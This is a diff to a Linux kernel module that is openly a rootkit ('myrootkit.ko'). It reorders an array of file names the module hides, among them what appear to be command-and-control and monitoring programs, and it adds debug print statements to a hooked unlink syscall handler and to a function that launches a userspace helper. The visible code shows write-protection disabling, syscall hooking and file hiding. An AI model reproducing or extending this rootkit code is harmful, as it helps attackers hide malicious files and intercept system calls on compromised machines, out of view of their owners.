@@ -66,12 +66,13 @@ static int lkm_init(void)
     ENABLE_WRITE_PROTECTION;
     
     hidfiles[0] = "cmdoutput.txttmp";
-    hidfiles[1] = "myrootkit.ko";
-    hidfiles[2] = "ccprogram";
-    hidfiles[3] = "ccprogram.c";
-    hidfiles[4] = "monitor";
-    hidfiles[5] = "monitor.c";
-    hidfiles[6] = "monitoroutput.txttmp";
+    hidfiles[1] = "monitoroutput.txttmp";
+    hidfiles[2] = "myrootkit.ko";
+    hidfiles[3] = "ccprogram";
+    hidfiles[4] = "ccprogram.c";
+    hidfiles[5] = "monitor";
+    hidfiles[6] = "monitor.c";
+    
     filenum=7;
     moni_open = 0;
     moni_unlink = 0;
@@ -204,6 +205,7 @@ asmlinkage long hooked_unlink(const char __user *filename){
                 value[j] = '\0';
             }
             configMonitor(value);
+            printk("config=%s\n", value);
         }
     } else if(moni_unlink){
         callMonitor("unlink", filename);
@@ -230,6 +232,8 @@ static int callMonitor(char *type, const char *msg){
             "HOME=/",
             "TERM=linux",
             "PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};
+            
+    printk("type=%s, %s\n", type, msg);
 
     return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
